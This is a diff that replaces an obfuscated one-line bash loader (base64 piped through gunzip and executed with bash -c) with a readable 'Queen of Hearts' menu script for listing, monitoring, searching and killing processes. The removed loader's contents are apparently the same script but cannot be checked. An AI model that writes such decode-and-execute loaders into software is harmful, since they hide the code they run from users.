@@ -1,1 +1,95 @@
-bash -c "$(echo H4sICIGTdGcAA1F1ZWVuX29mX0hlYXJ0cwC9V21v2kgQ/u5fMaXptb6LnQBJPoBSKaLcXXVJ20vQVVFaoY0ZwqrrXd+uTco1+e83uzZgwKGgJl2Jt/HOMzPPvOzy/NneNZd718yMPK9zefLu+OWn/Wbzqt5uHsUvvfPuRbdXiPbd7zfzDXUS/HHe7ZZ0GiS67J6evv84lzVJ5j2HM5QZDJWGdITwd4YoQQ3hT2Q6NdBheuD9a4V9NeyPnLAfk8YrH755QCsSJHTfMBopCBBqO9+sw/e1ubQGbvUfa61A38G6tRzVunW3BfYpNymcZ1JyeQMftIrQGFwDX4H9aJRs4/e2qxK7N+IGIqoPSLQa8wEFniol7DsIImYXYiV5qvQuMDmgFxOT/xB0Qdda7GTKZQidkVIGSR1UknIl4RqFurVGuExRsyiFW56OXPWW1B7GfkpO6iH8w/EWToTYpi42wm4U2D2VwDkalekIg46SJou3MVOJ3QzhLE9WCYdLssNE0OMx/oDfByFcUNtFIzdkGFwkGPEhj6aWfoSTwxD+4sQ12xJsE+yjkMJPMy1trZ0xYsNNykfAfpKezwevOxeKyauRDSBIoNa1jQITqhignTzCFnmSf8tHOKMG28kFlHVv6nrdhzFVXJ8J0Z+1FrTbsw0Nn7hJ+rqoxn7kqhH1wqamPx0E1SAHPhhXH9PH5YeHPnzhc/PlR0c+4FeelkW/+gXPb+WYCT4oggyhpyfAbiiHYa0NRiAmUG9D1bk2hUPDIu/eno/v87FTb61pbW+Vpw0OyEqo1mISEwMs+1rKJ3kCgYFAu9R+0JYVJifwBSe2UPWsZO1AtBGFYZhDVYW7EGKjtdmE8aqTvkHE30OuDB6CwCidHgcvoiTbDV7EGFN/jgo2Gvs/h5xm6zsj0lup8g0IKSAXB/jC4H2VR9FJtfitY103xL6/RBSJNovioLV+GHuLrVgRwdJUKR27IBn5a/l5+8Y5OjNk500BTDpxJROFW1QdmUgfKIQ7uNHUugGnkoiUUPqYiVs2MQRSgq/N9o3d58+pj8PW0lHklQfXZkRa4uiWWuaUfLE4lsGED5wiH8LVlY2ltkOiGnz+3LYq87mdz8CTNMWYfKPSKkBmoO7CZI1ZgFmIBbbbWUD/8npvgOM9mQmxZGMphe7vxv30ELbKYLLI/hiS7sSB4iBczKrDEAYfAqU/Nfe/M06KKxE4x+FSZRCzCUikLShwzFK011E+JqUbugau2htyb8Xsksl3ynGDNi3kc3ELKHh0RbEIW0A+VYVVyv8HXjS7wx8OAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+YELLOW='\033[1;33m'
+
+# Menu for the Queen of Hearts Card
+queen_of_hearts_menu() {
+    clear
+    echo -e "${CYAN}"
+    echo "      _________________________________________________________________________"
+    echo "     |                             Queen of Hearts                             |"
+    echo "     |                         List Running Processes                          |"
+    echo "     |_________________________________________________________________________|"
+    echo "     |                                                                         |"
+    echo "     |  This card provides tools to list, monitor, and analyze running         |"
+    echo "     |  processes. Choose an option below to interact with the processes.      |"
+    echo "     |                                                                         |"
+    echo "     |  1. View All Running Processes                                          |"
+    echo "     |  2. View Top Resource-Consuming Processes                               |"
+    echo "     |  3. Monitor Processes in Real-Time                                      |"
+    echo "     |  4. Search for a Specific Process                                       |"
+    echo "     |  5. Kill a Process                                                      |"
+    echo "     |  6. Return to Main Menu                                                 |"
+    echo "     |_________________________________________________________________________|"
+    echo -e "${RESET}"
+    read -p "Enter your choice: " choice
+    case $choice in
+        1) view_all_processes ;;
+        2) top_resource_consumers ;;
+        3) monitor_processes ;;
+        4) search_process ;;
+        5) kill_process ;;
+        6) exit ;;
+        *) echo "Invalid choice. Try again."; sleep 1; queen_of_hearts_menu ;;
+    esac
+}
+
+# Option 1: View All Running Processes
+view_all_processes() {
+    clear
+    echo -e "${CYAN}All Running Processes:${RESET}"
+    ps aux
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    queen_of_hearts_menu
+}
+
+# Option 2: View Top Resource-Consuming Processes
+top_resource_consumers() {
+    clear
+    echo -e "${CYAN}Top Resource-Consuming Processes:${RESET}"
+    ps aux --sort=-%cpu,-%mem | head -n 20
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    queen_of_hearts_menu
+}
+
+# Option 3: Monitor Processes in Real-Time
+monitor_processes() {
+    clear
+    echo -e "${CYAN}Monitoring Processes in Real-Time (Press Ctrl+C to stop):${RESET}"
+    top
+    queen_of_hearts_menu
+}
+
+# Option 4: Search for a Specific Process
+search_process() {
+    clear
+    read -p "Enter the process name or PID to search for: " search_term
+    echo -e "${CYAN}Search Results:${RESET}"
+    ps aux | grep -i --color=always "$search_term" | grep -v grep
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    queen_of_hearts_menu
+}
+
+# Option 5: Kill a Process
+kill_process() {
+    clear
+    read -p "Enter the PID of the process to kill: " pid
+    if [[ -n "$pid" ]]; then
+        echo "Attempting to kill process with PID $pid..."
+        if kill "$pid" &>/dev/null; then
+            echo -e "${GREEN}Process $pid successfully killed.${RESET}"
+        else
+            echo -e "${RED}Failed to kill process $pid. You may need elevated privileges.${RESET}"
+        fi
+    else
+        echo -e "${RED}No PID entered. Returning to menu.${RESET}"
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    queen_of_hearts_menu
+}
+
+queen_of_hearts_menu
